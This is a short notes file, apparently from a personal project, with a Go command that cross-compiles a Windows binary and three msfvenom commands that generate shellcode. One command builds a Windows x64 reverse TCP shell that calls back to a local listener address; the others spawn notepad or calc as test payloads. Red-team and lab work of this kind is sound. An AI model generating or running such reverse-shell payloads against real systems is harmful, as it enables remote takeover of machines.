# pepepepe

export GO111MODULE=on
CGO_ENABLED=on GOARCH=amd64 GOOS=windows go build main.go && /home/mor/GOPATH/src/github.com/morentharia/py_sketches/venv/bin/python deploy.py


msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=notepad.exe -b '\x00\x0A\x0D' -f raw -o shellcode.bin

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.53 LPORT=9999 -f raw -o shellcode.bin


msfvenom -p windows/exec cmd=calc.exe -f c -e x86/alpha_mixed -o shellcode.bin

